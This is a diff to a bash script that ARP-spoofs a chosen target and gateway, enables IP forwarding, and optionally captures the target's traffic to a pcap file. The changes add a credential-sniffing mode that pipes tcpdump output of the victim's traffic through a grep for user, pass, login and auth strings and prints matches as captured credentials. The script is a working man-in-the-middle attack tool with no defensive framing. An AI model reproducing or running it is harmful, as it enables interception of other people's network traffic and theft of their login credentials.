@@ -1,5 +1,5 @@
 #!/bin/bash
-# arp spoof with optional traffic capture
+# arp spoof with traffic capture and credential sniffing
 
 if [ "$EUID" -ne 0 ]; then
     echo "run as root"
@@ -7,8 +7,9 @@ if [ "$EUID" -ne 0 ]; then
 fi
 
 show_usage() {
-    echo "usage: ./spoof.sh [-i iface] [-c capfile] <target> <gateway>"
-    echo "  -c  capture traffic to pcap file"
+    echo "usage: ./spoof.sh [-i iface] [-c capfile] [-s] <target> <gateway>"
+    echo "  -c  capture traffic to pcap"
+    echo "  -s  sniff for credentials (http basic auth, ftp, telnet)"
 }
 
 get_mac() {
@@ -23,10 +24,12 @@ get_default_iface() {
 
 iface=""
 capfile=""
-while getopts "i:c:h" opt; do
+sniff=0
+while getopts "i:c:sh" opt; do
     case $opt in
         i) iface="$OPTARG" ;;
         c) capfile="$OPTARG" ;;
+        s) sniff=1 ;;
         h) show_usage; exit 0 ;;
         *) show_usage; exit 1 ;;
     esac
@@ -38,12 +41,7 @@ gateway="$2"
 [ -z "$target" ] || [ -z "$gateway" ] && { show_usage; exit 1; }
 [ -z "$iface" ] && iface=$(get_default_iface)
 
-for cmd in arpspoof; do
-    if ! command -v $cmd &>/dev/null; then
-        echo "$cmd not found"
-        exit 1
-    fi
-done
+command -v arpspoof &>/dev/null || { echo "arpspoof not found (install dsniff)"; exit 1; }
 
 echo "resolving..."
 target_mac=$(get_mac "$target")
@@ -55,7 +53,6 @@ gateway_mac=$(get_mac "$gateway")
 echo "target:  $target ($target_mac)"
 echo "gateway: $gateway ($gateway_mac)"
 echo "iface:   $iface"
-[ -n "$capfile" ] && echo "capture: $capfile"
 echo ""
 
 echo 1 > /proc/sys/net/ipv4/ip_forward
@@ -78,7 +75,14 @@ trap cleanup INT TERM
 if [ -n "$capfile" ]; then
     tcpdump -i "$iface" -w "$capfile" host "$target" &>/dev/null &
     pids+=($!)
-    echo "capturing traffic to $capfile"
+fi
+
+if [ $sniff -eq 1 ]; then
+    echo "sniffing for credentials..."
+    tcpdump -i "$iface" -A -l host "$target" 2>/dev/null | grep -iE '(user|pass|login|auth)' --line-buffered | while read -r line; do
+        echo "[cred] $line"
+    done &
+    pids+=($!)
 fi
 
 arpspoof -i "$iface" -t "$target" "$gateway" &>/dev/null &
